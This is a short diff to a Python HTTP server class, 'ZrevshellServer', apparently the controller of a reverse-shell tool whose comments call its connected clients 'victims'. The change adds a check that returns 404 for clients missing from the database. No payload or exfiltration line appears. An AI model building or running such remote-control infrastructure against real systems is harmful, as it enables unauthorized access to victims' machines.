@@ -631,6 +631,13 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             # use that to check if the user can access the path it's accessing
             client_type = self.get_client_type_from_db(client_id)
 
+            # If client type is None it means the user ain't in the database
+            # so respond with a not found, since the victim is not found in the
+            # database
+            if client_type is None:
+                self.send_response(HTTPStatus.NOT_FOUND)
+                return self.end_headers()
+
             # Check if the client has needed tokens for it's type
             has_tokens = legit_user[client_type.__str__()]
 
